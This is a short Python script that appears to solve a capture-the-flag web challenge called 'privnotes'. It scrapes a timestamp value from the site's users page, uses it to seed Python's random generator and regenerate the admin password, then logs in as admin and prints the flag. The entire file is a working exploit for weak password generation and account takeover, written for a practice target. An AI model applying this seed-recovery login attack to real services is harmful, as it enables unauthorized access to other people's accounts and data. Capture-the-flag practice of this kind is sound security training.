#!/usr/bin/env python3
import requests, os, re, random, string

REGEX = r'raw="[\d]*[.][\d]*"'
FLAG = r'flag{.*}'
SITE = "http://privnotes.challs.olicyber.it/"
s = requests.Session()
s.post(SITE + 'register', data={'username': os.urandom(8).hex()})
r = s.get(SITE + 'users')
raws = float(re.findall(REGEX, r.text)[0].replace('raw="', '').replace('"', ''))
random.seed(raws)
password = "".join(random.choices(string.ascii_letters + string.digits, k=16))
s.post(SITE + 'login', data={'username': 'admin', 'password': password})
r = s.get(SITE + 'notes')
flag = re.findall(FLAG, r.text)[0]
print(flag)